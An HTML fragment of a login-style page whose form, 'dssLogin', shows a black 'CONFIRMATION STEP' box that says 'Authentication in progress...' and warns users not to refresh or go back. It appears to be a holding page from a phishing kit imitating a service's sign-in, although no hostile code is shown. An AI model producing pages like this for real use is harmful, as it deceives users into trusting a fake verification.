...
<body id="app_index" class="js-focus-visible">
    ...
    <div id="webAppRoot" data-reactroot="">
        ...
        <header class="header-container">
            <img src="../img/icon-loader-32@3x.png" id="logo" class="logo" style="
    width: 120px;
">
        </header>
            </div>
                    ...
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        ...
                        <div class="form-container" style=" background-color: black; padding: 70px; margin: 0 auto; border-radius: 4PX;">
                            <form id="dssLogin" name="dssLogin" action="" method="post">
                                <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="font-weight: 600; color: #fff; margin: 0px; padding: 6px 0px 0px 4px;">CONFIRMATION STEP</div>
                                <br>
                                <h3 color="white" style="color: #fff; margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Authentication in progress...</h3>
                                ...
                                <div>
                                    <center>
                                        ...
                                        <p style="font-weight: bold;">Do not refresh or go back. Refreshing the page or going back to the previous page during a verification may cause the browser to initiate another request.                                        </p>
                                    </center>
                                </div>
                            </form>
                        </div>
